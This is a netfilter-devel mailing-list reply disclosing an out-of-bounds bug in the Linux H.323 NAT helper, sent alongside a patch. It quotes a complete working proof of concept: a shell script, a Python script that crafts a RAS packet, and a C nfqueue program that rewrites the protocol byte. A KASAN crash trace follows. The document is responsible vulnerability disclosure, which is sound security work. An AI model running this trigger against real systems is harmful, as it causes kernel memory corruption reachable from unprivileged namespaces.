Received: from mail-ej1-f45.google.com (mail-ej1-f45.google.com [209.85.218.45])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B2AFC1F78E6
	for <netfilter-devel@vger.kernel.org>; Wed, 29 Jul 2026 01:20:03 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.218.45
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785288006; cv=pass; b=gveD/0zQb6laC6D0Z7oi1Fg8pqHnF2xUArl4+mblBf/4q5eqZ5PlGyrKJTC1/voPzCXilv0wXs3nc0OEiLll3blYRQGloVhdutbEVNFTEQLOjD4Y+W9Yhw1S6bJ8OdhVJjRpvoMGEsy5I/xmvf9BfqAIJCrilPvl+r0gY3kR74I=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785288006; c=relaxed/simple;
	bh=y74yiE1IaXgoJIinSMHJd/TGDDAKySh3Nk6KjsW/ovY=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=Qf6j0gF95Csn6Aes/Vowk9kULPxQde++ZKF0jf4w1uQ0x+0F7vtKkldNUleD3Z06oKDHutyCeb6HlypmIRiChvy8j2/nKxRz83pTN6SrG0mUeP8STZsjgsYTiZEpZ3EbdUFOL49uiLXfB+DwGJwRtyUtmY3Ld2ERnrwCdJiwErE=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=l1VRdY/1; arc=pass smtp.client-ip=209.85.218.45
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="l1VRdY/1"
Received: by mail-ej1-f45.google.com with SMTP id a640c23a62f3a-c15f020a223so68312066b.1
        for <netfilter-devel@vger.kernel.org>; Tue, 28 Jul 2026 18:20:03 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1785288002; cv=none;
        d=google.com; s=arc-20260327;
        b=pnaHnE5TOodMouqpqWE5kAGPZEK30y0QGKTRVCwZil4HCCPDdA5hCpGd6DmwY7u9Lv
         YOl+g6X3+nBrbToXKNUDu3G6iZ/9peVZeSP70emVczNDZYC6/KCtPu1vDdqsXOitur6V
         ZflXoVHxv6KcTuiOrOuZUVhRkTjgUftnq/tUkrzMHPOAkUOO12Fo+YP/pcufvOxa0Yc5
         k3RKeKquBcfct4kDN2UZFi4J7K1/pd+laTN9UfuTws6gqocmNnS26KxCoX5VQiGxBZUH
         gBZruMO9wZ2kYgkeeEmox/LKZ+WPmR0fC17OHpISXynPCxtazMxUpLBUFUI3R4oy2g1u
         +Eug==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=/2Yk6zQ78vopztvOYyUiEe7jLFoWX1+/m99KfOwVWAo=;
        fh=YfZ0jQjJU91Y9azimw1TfeZOE7K4IOI00XcTXKagtyc=;
        b=ZbLHmYTg2bnX0v3s3as91p514Um5/w5Mkp6dRQcHB9hpLWDFzYZfKjThUUZfBWhoDC
         iO9x2V/lbkRGXTiBVCMhGzx9iZr02F7pPBQiBgXnX1IzRJwmaXHNUZbQEsizhdv0Piha
         BLyKvYVasKAfmdfx0FMxcwM7VmthpVtLlsXmHb71OORScDNh/4ozvW/ixklc6nsUPn+F
         18MVeEaudJoF0gcEn59+NbHZkP/oC/TsRgxV2PipeudvX8+XR6xxXAlD+sbjvCl5ubns
         kB2ym36aglYgipff8cWCJqIB7M5aQlxLMUJ7ZUccnhlLAu/IjC91/6XBCzol0jWb5vTY
         TpoQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785288002; x=1785892802; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=/2Yk6zQ78vopztvOYyUiEe7jLFoWX1+/m99KfOwVWAo=;
        b=l1VRdY/1LeR2P679aBWlt4eVBFnBhZR+vb56dQtnU0W+Gtu8v4mALOFCZLyUIGhkV5
         qu7Phr9nchbtLmHAF2Yev37L7KI54jtPxBgeFvMmx+o3fSMajqKysQHqMAD5FVFCmKh7
         zskUPgAwKnPe3jOMIg0TleI9Jk/qIVhRu69bspJF88jIHAkxdxsD22TwhPnxg2QfPzRa
         cBHVkfNaJ+FsUt1jnyJ3dnQy59DLQ9sRFFFnOqcvBhpSCou3BJS3RTXJ2sM2gFt90I1p
         XeFl8DMxhZuik3sLW+9csdexkLC9jU2/NcbX8BJGuti/TXHRkSaV1pSMcfIjxsyY2Bmo
         54uQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785288002; x=1785892802;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=/2Yk6zQ78vopztvOYyUiEe7jLFoWX1+/m99KfOwVWAo=;
        b=o/k2CAZaf8jldGQeqKTo/3bgL/Bae4bPGGMKrPzTcukVguIG5t996dUOhAFZtUh/ay
         2opaGLxtb8OtQiwRks5/klWgsqgU21Uz8ROBb0YsGhtIa/aB8T/6des+K2Gag9QM+uj0
         kGU0GL822AhXElenkVR+afh+KnvifeoBbYSRB9UkSC3F8T8IHNoDzq72PZpC4n82g0KK
         8qe8BUgZfn+1vMh+k+GXadAcvXFlyVWEoRMAcw1C7xxNKqJDMGktZLyVxG3pp+pTxjy+
         1SYad6/wpAv+5g6ixEPj5NAEToHsxks+WvspxU37bMZd46PDfge2dZg0dZqAiyhnpR/z
         wfWg==
X-Forwarded-Encrypted: i=1; AHgh+RpmMrL9j98RoXvelgeet3+46rZ+r11hhEm7D4hnPUKLBRiqyZlUAPJcwMbiTzj3NmIrK/vdgLM7YjK22aS7EtI=@vger.kernel.org
X-Gm-Message-State: AOJu0Yxq3+5XMn2Bvh7wbn5VzbgBVT/y6qmn6K6rjH46X4DmDAxC7TkL
	Z1QM8IPBYbgZ3uP5vukCW+JhF5cws6qeQFdoVjMk6I6Wh+R+vv+/Y11ZCskFUuz9jp9IaNGlFFx
	9DLJb3R22rlhCTe5UC36dmDWgTDPhC+Pkf8zYFv/xJAU=
X-Gm-Gg: AR+sD12RtUsmL/0BRzcyRcUgWvqwddoI8gTOhUm0tWuYqlIC+zdxI5UQN8t7t79htIw
	9vRvOBGNWasZswSQldv/8IPCZMtF9q100Ubi6X0rBKreRQWA4JVLzNXqSr3a3w41qVdddQErzCI
	0yaPZOGQQjWzUkQTw+gtRKhZAqcjZffFtNRskOYjfxXagiOzJXp8HYjDhU7caK0SO+62SCXMHrs
	HOV/vq0l4EU18eDGTudrFfSpyMfEwW2Jn6zM1tcsmclisHbT/d13DSesya/6DTQqQlDRf9/iuTe
	n1s6UdfrjNMPKF4yKh/BT0w9MHi9wBvwbZ7RbsJgOCcp
X-Received: by 2002:a17:907:9410:b0:c15:fd85:c5f7 with SMTP id
 a640c23a62f3a-c1f71d61c5emr252781466b.4.1785288001495; Tue, 28 Jul 2026
 18:20:01 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <cover.1785133455.git.zhilinz@nebusec.ai> <amkFqw-2vdtxEogs@chamomile>
In-Reply-To: <amkFqw-2vdtxEogs@chamomile>
From: zhilin zou <zhilinz@nebusec.ai>
Date: Wed, 29 Jul 2026 09:19:47 +0800
X-Gm-Features: AUfX_mwXmpkD7nVmgXEAzN1xfmCZpytDTXhjlkbH1OrBeMO_I2CrqsEoQKTyU20
Message-ID: <CANB6i5yBvEWuF36SQ0BH+1msCxhgsmT11zdd6Az7gt4oKQ6P-Q@mail.gmail.com>
Subject: Re: [PATCH nf 0/1] netfilter: h323: fix helper NAT mangling
To: Pablo Neira Ayuso <pablo@netfilter.org>
Cc: Ren Wei <enjou1224z@gmail.com>, netfilter-devel@vger.kernel.org, fw@strlen.de, 
	phil@nwl.cc, davem@davemloft.net, edumazet@google.com, pabeni@redhat.com, 
	horms@kernel.org, zhaojignmin@hotmail.com, kaber@trash.net, vega@nebusec.ai
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Wed, Jul 29, 2026 at 3:40=E2=80=AFAM Pablo Neira Ayuso <pablo@netfilter.=
org> wrote:
>
> Hi,
>
> On Tue, Jul 28, 2026 at 01:58:22AM +0800, Ren Wei wrote:
> > From: Zhiling Zou <zhilinz@nebusec.ai>
> >
> > Hi Linux kernel maintainers,
> >
> > We found and validated an issue in net/ipv4/netfilter/nf_nat_h323.c and
> > net/netfilter/nf_conntrack_h323_main.c. The bug is reachable by a
> > non-root user after creating user and net namespaces with namespace-loc=
al
> > CAP_NET_ADMIN.
> >
> > We've tested it, and it should not affect any other functionality.
> >
> > We will provide detailed information about the bug
> > in this email, along with a PoC to trigger it.
> >
> > ---- details below ----
> >
> > Bug details:
> >
> > H.323 conntrack helpers parse packet payloads according to the helper
> > that is attached to the conntrack entry. RAS parses UDP payloads, while
> > Q.931 and H.245 parse TPKT data from TCP payloads.
> >
> > The NAT helper later calls set_addr() to rewrite addresses embedded in
> > those helper payloads. Before this fix, set_addr() chose
> > nf_nat_mangle_tcp_packet() or nf_nat_mangle_udp_packet() from the
> > packet's current IPv4 protocol byte. A namespace-local packet modifier
> > can rewrite that byte after conntrack has accepted the original layout
> > and before helper processing at the confirm hook.
>
> You assume IPv4 protocol byte has been updated, and you provide an
> example utility for nfqueue.
>
> But we have already restricted this:
>
> commit 54f34607d184c1cc056c59a5b3d86d96dd6a515c
> Author: Florian Westphal <fw@strlen.de>
> Date:   Tue Jun 9 13:51:53 2026 +0200
>
>     netfilter: nfnetlink_queue: restrict writes to network header
>
> commit df07998dfd40796a05fff7ffea2661ad65ed42a7
> Author: Florian Westphal <fw@strlen.de>
> Date:   Tue Jun 9 13:51:54 2026 +0200
>
>     netfilter: nftables: restrict linklayer and network header writes
>
> are you running a kernel with this patches?

Hi Pablo,

I re-tested the PoC on a kernel which already contains both commits:

54f34607d184 ("netfilter: nfnetlink_queue: restrict writes to network heade=
r")
df07998dfd40 ("netfilter: nftables: restrict linklayer and network
header writes")

The issue still reproduces. The crash is:

BUG: KASAN: out-of-bounds in mangle_contents+0x13a/0x680

and the trace goes through:

mangle_contents()
__nf_nat_mangle_tcp_packet()
set_addr()
set_ras_addr()
ras_help()
nfqnl_recv_verdict()

So these commits do not seem to block this NFQUEUE/H.323 NAT mangling path.

>
> > This makes the parser and NAT mangler use different transport-header
> > bases. The PoC attaches the RAS helper to a UDP conntrack, queues the
> > packet, changes the IPv4 protocol byte to TCP, and reinjects it.
> > ras_help() still parses the address relative to the UDP payload, but
> > set_addr() uses the TCP mangler and a forged TCP data offset. The NAT
> > match offset then points past skb->tail and KASAN reports an
> > out-of-bounds access in mangle_contents().
> >
> > There is a second edge case on the H.245 helper path. The H.245 helper
> > is registered with IPPROTO_UDP, but h245_help() parses TPKT/TCP data an=
d
> > uses the TCP doff as its base. Userspace can bind the registered H.245
> > helper to a UDP conntrack with nftables. If NAT then selected the mangl=
er
> > only from the UDP tuple, the same parser/mangler base mismatch would
> > remain reachable.
> >
> > The fix selects the NAT mangler from nf_ct_protonum(ct), the stable
> > protocol stored in the conntrack tuple, instead of the mutable IPv4
> > protocol byte. It also ignores H.245 helper invocations on non-TCP
> > conntracks before the TCP parser can feed offsets to NAT.
> >
> > Reproducer:
> >
> >     ./poc.sh
> >
> > For user namespace reproduction:
> >
> >     unshare -Urn sh -c '
> >       cd /path/to/reproducer &&
> >       ./poc.sh
> >     '
> >
> > We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
> >
> > ------BEGIN poc.sh------
> >
> > #!/bin/sh
> > set -eu
> >
> > DIR=3D$(CDPATH=3D cd -- "$(dirname -- "$0")" && pwd)
> > IPT=3D${IPT:-/usr/sbin/iptables-legacy}
> > IP=3D${IP:-/usr/sbin/ip}
> > XTABLES_LOCKFILE=3D${XTABLES_LOCKFILE:-${DIR}/xtables.lock}
> > export XTABLES_LOCKFILE
> > QUEUE_NUM=3D${QUEUE_NUM:-0}
> > SRC_IP=3D${SRC_IP:-10.0.0.1}
> > NAT_IP=3D${NAT_IP:-10.0.0.3}
> > DST_IP=3D${DST_IP:-10.0.0.2}
> > SRC_PORT=3D${SRC_PORT:-40000}
> > DST_PORT=3D${DST_PORT:-1719}
> > DEV=3D${DEV:-tun0}
> > NFQ_PID=3D
> >
> > cleanup() {
> >       if [ -n "${NFQ_PID}" ]; then
> >               kill "${NFQ_PID}" 2>/dev/null || true
> >               wait "${NFQ_PID}" 2>/dev/null || true
> >       fi
> >       ${IPT} -t raw -D OUTPUT -p udp --dport "${DST_PORT}" -j CT --help=
er RAS 2>/dev/null || true
> >       ${IPT} -t mangle -D OUTPUT -p udp --dport "${DST_PORT}" -j NFQUEU=
E --queue-num "${QUEUE_NUM}" 2>/dev/null || true
> >       ${IPT} -t nat -D POSTROUTING -o "${DEV}" -j SNAT --to-source "${N=
AT_IP}" 2>/dev/null || true
> >       ${IP} link del "${DEV}" 2>/dev/null || true
> > }
> > trap cleanup EXIT INT TERM
> >
> > if [ "$(id -u)" !=3D "0" ]; then
> >       echo "run as root or as uid 0 inside a user namespace" >&2
> >       exit 1
> > fi
> >
> > ${IP} link del "${DEV}" 2>/dev/null || true
> > ${IP} tuntap add dev "${DEV}" mode tun user root
> > ${IP} addr add "${SRC_IP}/24" dev "${DEV}"
> > ${IP} addr add "${NAT_IP}/24" dev "${DEV}"
> > ${IP} link set "${DEV}" up
> > ${IP} route replace "${DST_IP}/32" dev "${DEV}"
> >
> > ${IPT} -t raw -A OUTPUT -p udp --dport "${DST_PORT}" -j CT --helper RAS
> > ${IPT} -t mangle -A OUTPUT -p udp --dport "${DST_PORT}" -j NFQUEUE --qu=
eue-num "${QUEUE_NUM}"
> > ${IPT} -t nat -A POSTROUTING -o "${DEV}" -j SNAT --to-source "${NAT_IP}=
"
> >
> > "${DIR}/nfq_mutate" "${QUEUE_NUM}" &
> > NFQ_PID=3D$!
> > sleep 1
> >
> > python3 - <<'PY'
> > from ipaddress import IPv4Address
> > import os
> > import socket
> >
> > src_ip =3D os.environ.get("SRC_IP", "10.0.0.1")
> > dst_ip =3D os.environ.get("DST_IP", "10.0.0.2")
> > src_port =3D int(os.environ.get("SRC_PORT", "40000"))
> > dst_port =3D int(os.environ.get("DST_PORT", "1719"))
> >
> > class BW:
> >     def __init__(self):
> >         self.bits =3D []
> >
> >     def bit(self, value):
> >         self.bits.append(1 if value else 0)
> >
> >     def bitsv(self, value, nbits):
> >         for shift in range(nbits - 1, -1, -1):
> >             self.bits.append((value >> shift) & 1)
> >
> >     def align(self):
> >         while len(self.bits) % 8:
> >             self.bits.append(0)
> >
> >     def bytes(self, data):
> >         self.align()
> >         for byte in data:
> >             self.bitsv(byte, 8)
> >
> >     def out(self):
> >         self.align()
> >         out =3D bytearray()
> >         for i in range(0, len(self.bits), 8):
> >             value =3D 0
> >             for bit in self.bits[i:i + 8]:
> >                 value =3D (value << 1) | bit
> >             out.append(value)
> >         return bytes(out)
> >
> > bw =3D BW()
> >
> > # RasMessage ::=3D locationRequest
> > bw.bit(0)
> > bw.bitsv(18, 5)
> >
> > # LocationRequest root: endpointIdentifier present, nonStandardData abs=
ent.
> > bw.bit(0)
> > bw.bitsv(0b10, 2)
> > bw.align()
> >
> > # requestSeqNum
> > bw.bytes((1).to_bytes(2, "big"))
> >
> > # endpointIdentifier: 121 UTF-16 code units. Byte 4 becomes 0xf0, which=
 the
> > # later TCP interpretation uses as a fake data offset.
> > bw.bitsv(120, 7)
> > bw.align()
> > bw.bytes(b"A\x00" * 121)
> >
> > # destinationInfo: empty
> > bw.align()
> > bw.bytes(b"\x00")
> >
> > # replyAddress ::=3D ipAddress { ip, port }
> > bw.bit(0)
> > bw.bitsv(0, 3)
> > bw.align()
> > bw.bytes(IPv4Address(src_ip).packed)
> > bw.align()
> > bw.bytes(src_port.to_bytes(2, "big"))
> >
> > payload =3D bw.out()
> > print(f"payload_len=3D{len(payload)} payload4=3D{payload[4]:#x}")
> >
> > s =3D socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
> > s.bind((src_ip, src_port))
> > s.sendto(payload, (dst_ip, dst_port))
> > PY
> >
> > wait "${NFQ_PID}"
> >
> > ------END poc.sh--------
> >
> > ------BEGIN nfq_mutate.c------
> >
> > #define _GNU_SOURCE
> > #include <arpa/inet.h>
> > #include <errno.h>
> > #include <libmnl/libmnl.h>
> > #include <linux/netfilter.h>
> > #include <linux/netfilter/nfnetlink.h>
> > #include <linux/netfilter/nfnetlink_queue.h>
> > #include <netinet/ip.h>
> > #include <stdbool.h>
> > #include <stdint.h>
> > #include <stdio.h>
> > #include <stdlib.h>
> > #include <string.h>
> > #include <unistd.h>
> >
> > struct queued_pkt {
> >       uint32_t id;
> >       uint8_t *payload;
> >       uint32_t payload_len;
> >       bool ready;
> > };
> >
> > static uint16_t ip_checksum(void *buf, size_t len)
> > {
> >       uint32_t sum =3D 0;
> >       uint16_t *p =3D buf;
> >
> >       while (len > 1) {
> >               sum +=3D *p++;
> >               len -=3D 2;
> >       }
> >       if (len)
> >               sum +=3D *(uint8_t *)p;
> >       while (sum >> 16)
> >               sum =3D (sum & 0xffff) + (sum >> 16);
> >       return ~sum;
> > }
> >
> > static int parse_attr_cb(const struct nlattr *attr, void *data)
> > {
> >       const struct nlattr **tb =3D data;
> >       int type =3D mnl_attr_get_type(attr);
> >
> >       if (mnl_attr_type_valid(attr, NFQA_MAX) < 0)
> >               return MNL_CB_OK;
> >
> >       switch (type) {
> >       case NFQA_PACKET_HDR:
> >               if (mnl_attr_validate2(attr, MNL_TYPE_UNSPEC,
> >                                      sizeof(struct nfqnl_msg_packet_hdr=
)) < 0)
> >                       return MNL_CB_ERROR;
> >               break;
> >       case NFQA_PAYLOAD:
> >               break;
> >       default:
> >               break;
> >       }
> >
> >       tb[type] =3D attr;
> >       return MNL_CB_OK;
> > }
> >
> > static int queue_cb(const struct nlmsghdr *nlh, void *data)
> > {
> >       const struct nlattr *tb[NFQA_MAX + 1] =3D {};
> >       const struct nfqnl_msg_packet_hdr *ph;
> >       struct queued_pkt *pkt =3D data;
> >
> >       mnl_attr_parse(nlh, sizeof(struct nfgenmsg), parse_attr_cb, (void=
 *)tb);
> >       if (!tb[NFQA_PACKET_HDR] || !tb[NFQA_PAYLOAD])
> >               return MNL_CB_ERROR;
> >
> >       ph =3D mnl_attr_get_payload(tb[NFQA_PACKET_HDR]);
> >       pkt->id =3D ntohl(ph->packet_id);
> >       pkt->payload_len =3D mnl_attr_get_payload_len(tb[NFQA_PAYLOAD]);
> >       pkt->payload =3D malloc(pkt->payload_len);
> >       if (!pkt->payload) {
> >               perror("malloc");
> >               exit(1);
> >       }
> >       memcpy(pkt->payload, mnl_attr_get_payload(tb[NFQA_PAYLOAD]),
> >              pkt->payload_len);
> >       pkt->ready =3D true;
> >       return MNL_CB_STOP;
> > }
> >
> > static struct nlmsghdr *build_cfg_pf_request(char *buf, uint8_t command=
)
> > {
> >       struct nlmsghdr *nlh =3D mnl_nlmsg_put_header(buf);
> >       struct nfgenmsg *nfg;
> >       struct nfqnl_msg_config_cmd cmd =3D {
> >               .command =3D command,
> >               .pf =3D htons(AF_INET),
> >       };
> >
> >       nlh->nlmsg_type =3D (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG;
> >       nlh->nlmsg_flags =3D NLM_F_REQUEST;
> >       nfg =3D mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
> >       nfg->nfgen_family =3D AF_UNSPEC;
> >       nfg->version =3D NFNETLINK_V0;
> >       mnl_attr_put(nlh, NFQA_CFG_CMD, sizeof(cmd), &cmd);
> >       return nlh;
> > }
> >
> > static struct nlmsghdr *build_cfg_request(char *buf, uint8_t command,
> >                                         uint16_t queue_num)
> > {
> >       struct nlmsghdr *nlh =3D mnl_nlmsg_put_header(buf);
> >       struct nfgenmsg *nfg;
> >       struct nfqnl_msg_config_cmd cmd =3D {
> >               .command =3D command,
> >               .pf =3D htons(AF_INET),
> >       };
> >
> >       nlh->nlmsg_type =3D (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG;
> >       nlh->nlmsg_flags =3D NLM_F_REQUEST;
> >       nfg =3D mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
> >       nfg->nfgen_family =3D AF_UNSPEC;
> >       nfg->version =3D NFNETLINK_V0;
> >       nfg->res_id =3D htons(queue_num);
> >       mnl_attr_put(nlh, NFQA_CFG_CMD, sizeof(cmd), &cmd);
> >       return nlh;
> > }
> >
> > static struct nlmsghdr *build_cfg_params(char *buf, uint8_t mode, int r=
ange,
> >                                        uint16_t queue_num)
> > {
> >       struct nlmsghdr *nlh =3D mnl_nlmsg_put_header(buf);
> >       struct nfgenmsg *nfg;
> >       struct nfqnl_msg_config_params params =3D {
> >               .copy_range =3D htonl(range),
> >               .copy_mode =3D mode,
> >       };
> >
> >       nlh->nlmsg_type =3D (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG;
> >       nlh->nlmsg_flags =3D NLM_F_REQUEST;
> >       nfg =3D mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
> >       nfg->nfgen_family =3D AF_UNSPEC;
> >       nfg->version =3D NFNETLINK_V0;
> >       nfg->res_id =3D htons(queue_num);
> >       mnl_attr_put(nlh, NFQA_CFG_PARAMS, sizeof(params), &params);
> >       return nlh;
> > }
> >
> > static struct nlmsghdr *build_verdict(char *buf, const struct queued_pk=
t *pkt,
> >                                     uint16_t queue_num, uint32_t verdic=
t)
> > {
> >       struct nlmsghdr *nlh =3D mnl_nlmsg_put_header(buf);
> >       struct nfgenmsg *nfg;
> >       struct nfqnl_msg_verdict_hdr vh =3D {
> >               .verdict =3D htonl(verdict),
> >               .id =3D htonl(pkt->id),
> >       };
> >
> >       nlh->nlmsg_type =3D (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_VERDICT;
> >       nlh->nlmsg_flags =3D NLM_F_REQUEST;
> >       nfg =3D mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
> >       nfg->nfgen_family =3D AF_UNSPEC;
> >       nfg->version =3D NFNETLINK_V0;
> >       nfg->res_id =3D htons(queue_num);
> >       mnl_attr_put(nlh, NFQA_VERDICT_HDR, sizeof(vh), &vh);
> >       mnl_attr_put(nlh, NFQA_PAYLOAD, pkt->payload_len, pkt->payload);
> >       return nlh;
> > }
> >
> > static void mutate_packet(struct queued_pkt *pkt)
> > {
> >       struct iphdr *iph;
> >       uint8_t *l4;
> >
> >       if (pkt->payload_len < sizeof(*iph))
> >               return;
> >
> >       iph =3D (struct iphdr *)pkt->payload;
> >       if (iph->version !=3D 4 || iph->ihl < 5)
> >               return;
> >       if (pkt->payload_len < iph->ihl * 4U + 13)
> >               return;
> >
> >       l4 =3D pkt->payload + iph->ihl * 4U;
> >       fprintf(stderr,
> >               "nfqueue: id=3D%u len=3D%u old_proto=3D%u doff_byte_befor=
e=3D%#x\n",
> >               pkt->id, pkt->payload_len, iph->protocol, l4[12]);
> >
> >       iph->protocol =3D IPPROTO_TCP;
> >       iph->check =3D 0;
> >       iph->check =3D ip_checksum(iph, iph->ihl * 4U);
> >
> >       fprintf(stderr,
> >               "nfqueue: id=3D%u new_proto=3D%u doff_byte_after=3D%#x\n"=
,
> >               pkt->id, iph->protocol, l4[12]);
> > }
> >
> > int main(int argc, char **argv)
> > {
> >       struct mnl_socket *nl;
> >       char buf[MNL_SOCKET_BUFFER_SIZE];
> >       struct nlmsghdr *nlh;
> >       struct queued_pkt pkt =3D {};
> >       unsigned int portid;
> >       uint16_t queue_num =3D 0;
> >       int ret;
> >
> >       if (argc > 1)
> >               queue_num =3D (uint16_t)atoi(argv[1]);
> >
> >       nl =3D mnl_socket_open(NETLINK_NETFILTER);
> >       if (!nl) {
> >               perror("mnl_socket_open");
> >               return 1;
> >       }
> >
> >       if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
> >               perror("mnl_socket_bind");
> >               return 1;
> >       }
> >       portid =3D mnl_socket_get_portid(nl);
> >
> >       nlh =3D build_cfg_pf_request(buf, NFQNL_CFG_CMD_PF_UNBIND);
> >       if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
> >               perror("PF_UNBIND");
> >
> >       nlh =3D build_cfg_pf_request(buf, NFQNL_CFG_CMD_PF_BIND);
> >       if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
> >               perror("PF_BIND");
> >               return 1;
> >       }
> >
> >       nlh =3D build_cfg_request(buf, NFQNL_CFG_CMD_BIND, queue_num);
> >       if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
> >               perror("QUEUE_BIND");
> >               return 1;
> >       }
> >
> >       nlh =3D build_cfg_params(buf, NFQNL_COPY_PACKET, 0xffff, queue_nu=
m);
> >       if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
> >               perror("CFG_PARAMS");
> >               return 1;
> >       }
> >
> >       for (;;) {
> >               ret =3D mnl_socket_recvfrom(nl, buf, sizeof(buf));
> >               if (ret < 0) {
> >                       perror("mnl_socket_recvfrom");
> >                       return 1;
> >               }
> >               ret =3D mnl_cb_run(buf, ret, 0, portid, queue_cb, &pkt);
> >               if (ret < 0) {
> >                       perror("mnl_cb_run");
> >                       return 1;
> >               }
> >               if (!pkt.ready)
> >                       continue;
> >
> >               mutate_packet(&pkt);
> >               nlh =3D build_verdict(buf, &pkt, queue_num, NF_ACCEPT);
> >               if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
> >                       perror("send verdict");
> >                       return 1;
> >               }
> >               free(pkt.payload);
> >               break;
> >       }
> >
> >       mnl_socket_close(nl);
> >       return 0;
> > }
> >
> > ------END nfq_mutate.c--------
> >
> > ----BEGIN crash log----
> >
> > [  142.557736] [   T1073] BUG: KASAN: out-of-bounds in mangle_contents =
(../net/netfilter/nf_nat_helper.c:38:2)
> > [  142.557790] [   T1073] Read of size 18446744073709551564 at addr fff=
f88810fc8ee9f by task nfq_mutate/1073
> >
> > [  142.557839] [   T1073] CPU: 1 UID: 1028 PID: 1073 Comm: nfq_mutate N=
ot tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
> > [  142.557860] [   T1073] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440F=
X + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> > [  142.557871] [   T1073] Call Trace:
> > [  142.557885] [   T1073]  <TASK>
> > [  142.557895] [   T1073]  dump_stack_lvl (../lib/dump_stack.c:118:3)
> > [  142.557963] [   T1073]  print_report (../include/linux/mm.h:1903:22 =
../mm/kasan/report.c:289:10 ../mm/kasan/report.c:376:22 ../mm/kasan/report.=
c:482:3)
> > [  142.558014] [   T1073]  ? mangle_contents (../net/netfilter/nf_nat_h=
elper.c:38:2)
> > [  142.558102] [   T1073]  kasan_report (../mm/kasan/report.c:593:2)
> > [  142.558133] [   T1073]  kasan_check_range (../mm/kasan/generic.c:183=
:10 ../mm/kasan/generic.c:200:9)
> > [  142.558145] [   T1073]  __asan_memmove (../mm/kasan/shadow.c:94:7)
> > [  142.558163] [   T1073]  mangle_contents (../net/netfilter/nf_nat_hel=
per.c:38:2)
> > [  142.558192] [   T1073]  __nf_nat_mangle_tcp_packet (../net/netfilter=
/nf_nat_helper.c:106:20)
> > [  142.558209] [   T1073]  set_addr (../net/ipv4/netfilter/nf_nat_h323.=
c:26:1)
> > [  142.558316] [   T1073]  set_ras_addr (../net/ipv4/netfilter/nf_nat_h=
323.c:166:18)
> > [  142.558379] [   T1073]  ras_help (../net/netfilter/nf_conntrack_h323=
_main.c:1675:2)
> > [  142.558565] [   T1073]  nf_confirm (../include/linux/skbuff.h:3130:2=
4 ../include/linux/ipv6.h:110:27 ../net/netfilter/nf_conntrack_proto.c:160:=
10)
> > [  142.558728] [   T1073]  nfqnl_reinject (../include/linux/bitops.h:12=
6:32 ../include/linux/jhash.h:139:3 ../include/linux/rhashtable.h:143:11 ..=
/include/linux/rhashtable.h:153:22 ../include/linux/rhashtable.h:168:9 ../i=
nclude/linux/rhashtable.h:1058:9 ../include/linux/rhashtable.h:1144:16 ../i=
nclude/linux/rhashtable.h:1173:9 ../net/netfilter/nfnetlink_queue.c:236:2)
> > [  142.558746] [   T1073]  nfqnl_recv_verdict (../net/netfilter/nfnetli=
nk_queue.c:1539:6)
